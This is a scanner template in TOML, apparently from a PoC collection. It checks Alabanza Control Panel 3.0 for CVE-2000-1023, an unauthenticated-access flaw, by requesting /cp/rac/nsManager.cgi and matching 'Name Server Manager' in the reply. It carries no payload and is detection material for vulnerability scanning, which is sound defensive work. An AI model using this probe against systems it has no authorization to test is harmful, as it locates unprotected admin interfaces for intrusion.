[info]
author = "ave"
description = "检测 Alabanza Control Panel 3.0 的 nsManager.cgi CGI 程序是否存在未授权访问漏洞，远程攻击者无需密码即可访问管理命令并修改域名信息"
id = "POC-AVE-2000-0747"
name = "Alabanza Control Panel 未授权访问 nsManager.cgi PoC"
severity = "high"
tags = ["ave-2000-0747"]
vuln_id = [
    "CVE-2000-1023",
    "AVE-2000-0747",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cp/rac/nsManager.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Name Server Manager"]
